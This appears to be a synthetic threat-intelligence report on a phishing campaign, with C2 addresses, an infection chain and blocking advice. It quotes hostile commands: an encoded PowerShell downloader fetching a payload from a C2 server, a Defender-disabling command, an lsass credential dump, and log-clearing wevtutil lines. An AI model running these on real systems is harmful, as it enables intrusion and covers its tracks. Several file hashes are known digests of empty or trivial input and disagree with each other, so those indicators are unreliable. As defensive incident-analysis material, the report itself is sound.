@@ -1,0 +1,77 @@
+THREAT INTELLIGENCE REPORT
+Campaign: Operation Rusty Anchor
+Date: 2026-06-15
+TLP: AMBER
+
+EXECUTIVE OVERVIEW
+==================
+Our IR team responded to an incident at a mid-sized financial services firm. Initial
+access was gained via a spearphishing email containing a malicious ISO attachment
+(SHA256: 3a7bd3e2360a3d29eea436fcfb7e44c735d117c42d1c1835420b6b9942dd4f1b).
+The ISO contained a shortcut (.lnk) file that executed a PowerShell downloader.
+
+The attacker's infrastructure consisted of two command-and-control servers:
+  - 185.220.101.47 (primary C2, Tor exit node — DO NOT block without coordination)
+  - 45.142.212.100 (secondary C2)
+  - Staging domain: update-cdn.microsoftonline-verify.com
+  - Exfiltration endpoint: https://transfer.sh/d9xQz/exfil.zip
+
+Attacker email used in the campaign: rusty.anchor.ops@protonmail.com
+
+INFECTION CHAIN
+===============
+1. Victim received phishing email with subject "Q2 Compliance Review Required"
+2. ISO attached as "Q2_Compliance_2026.iso"
+   MD5:    c4ca4238a0b923820dcc509a6f75849b
+   SHA1:   da39a3ee5e6b4b0d3255bfef95601890afd80709
+   SHA256: 3a7bd3e2360a3d29eea436fcfb7e44c735d117c42d1c1835420b6b9942dd4f1b
+3. LNK file executed:
+   cmd.exe /c powershell.exe -WindowStyle Hidden -EncodedCommand
+   SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8=
+4. PowerShell downloaded secondary payload from:
+   https://185.220.101.47/stage2/rusty.exe
+5. rusty.exe (SHA256: b14a7b8059d9c055954c92674ce60032d77751c17b8bdf8e0d0e3c3012c6e738)
+   - Established persistence via registry run key:
+     HKCU\Software\Microsoft\Windows\CurrentVersion\Run -> "WindowsUpdate" -> rusty.exe
+   - Injected into explorer.exe
+   - Disabled Windows Defender via PowerShell:
+     Set-MpPreference -DisableRealtimeMonitoring $true
+6. Lateral movement: PsExec to 3 internal workstations using harvested credentials
+7. Credential dump: executed procdump.exe against lsass.exe
+8. Exfiltrated ~2GB of financial records via HTTPS to transfer.sh
+9. Deleted Windows event logs:
+   wevtutil cl System && wevtutil cl Security && wevtutil cl Application
+
+ADDITIONAL DOMAINS OBSERVED
+============================
+The following domains were seen in DNS logs during the incident window:
+  - rustyanchor-cdn.top
+  - assets.secure-update-portal.xyz
+  - ocsp.msftncsi-check.net (likely legitimate — analyst verify)
+
+AFFECTED HOST ARTIFACTS
+========================
+Host: WKSTN-FIN-047 (192.168.1.47 — internal, do not block)
+Malicious files found:
+  - C:\Users\jsmith\AppData\Roaming\rusty.exe
+  - C:\Windows\Temp\procdump.exe
+  - C:\Windows\Temp\stage2_loader.dll
+    SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+
+Attacker also used certutil.exe to decode payloads:
+  certutil.exe -decode encoded.b64 rusty.exe
+
+UNCERTAINTIES
+=============
+- Attribution: TTPs overlap with TA505 but not confirmed.
+- The domain ocsp.msftncsi-check.net may be a legitimate Microsoft domain (analyst verify).
+- Victim's backup systems may have been accessed — investigation ongoing.
+- It is unknown whether rusty.exe has additional capabilities not yet observed.
+
+RECOMMENDATIONS
+===============
+- Block the two C2 IPs at perimeter (coordinate with NOC on 185.220.101.47 due to Tor)
+- Sinkhole or block malicious domains at DNS layer
+- Hunt for rusty.exe hash across endpoint fleet
+- Review scheduled tasks and registry run keys on all endpoints
+- Reset credentials for all accounts known to have been on compromised hosts
